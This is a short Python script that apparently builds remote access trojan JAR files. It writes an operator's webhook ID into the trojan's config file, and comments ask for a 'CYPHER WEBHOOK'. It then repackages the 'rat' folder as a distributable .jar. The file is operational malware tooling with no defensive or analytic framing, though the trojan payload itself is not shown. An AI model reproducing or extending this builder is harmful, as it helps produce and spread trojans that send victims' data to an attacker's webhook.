import os
from os import path
import shutil
import time
import datetime
import zipfile



def extractJar(jarLoc,extractLoc):
    with zipfile.ZipFile(jarLoc, 'r') as zip_ref:
        zip_ref.extractall(extractLoc)

def zipper (folder,output):
    shutil.make_archive("rat", "zip",folder)
    # Rename the .zip file to a .jar file

def zip_to_jar(input_file, output_file):

    # Open the ZIP file in read mode.
    zip_file = zipfile.ZipFile(input_file, mode='r')

    # Create a new JAR file in write mode.
    jar_file = zipfile.ZipFile(output_file, mode='w')

    # Write all of the files from the ZIP file to the JAR file.
    for item in zip_file.infolist():
        buffer = zip_file.read(item.filename)
        jar_file.writestr(item, buffer)

    # Close the JAR file.
    jar_file.close()

    # Close the ZIP file.
    zip_file.close()

cwd = os.getcwd()
#outputLoc = "NAME OUT THE JAR WHEN IT OUTPUTS MUST INCLUDE .jar AT END"
RatSRCdump = f"{cwd}/SRC"
#RatLoc = "RAT LOCATION"
#Webhook = "PUT CYPHER WEBHOOK HERE"
configfolder = f"{cwd}/SRC/assets/recode/config.txt"


def newWebhook(outputLoc, version, webhookID): 
    configfolder = f"{cwd}/rat/{version}/assets/recode/config.txt"
    file = open(configfolder, "w")
    file.writelines(webhookID)
    file.close()

    zipper(f"{cwd}/rat/{version}",outputLoc)

    zip_to_jar('rat.zip', outputLoc)

    os.remove('rat.zip')



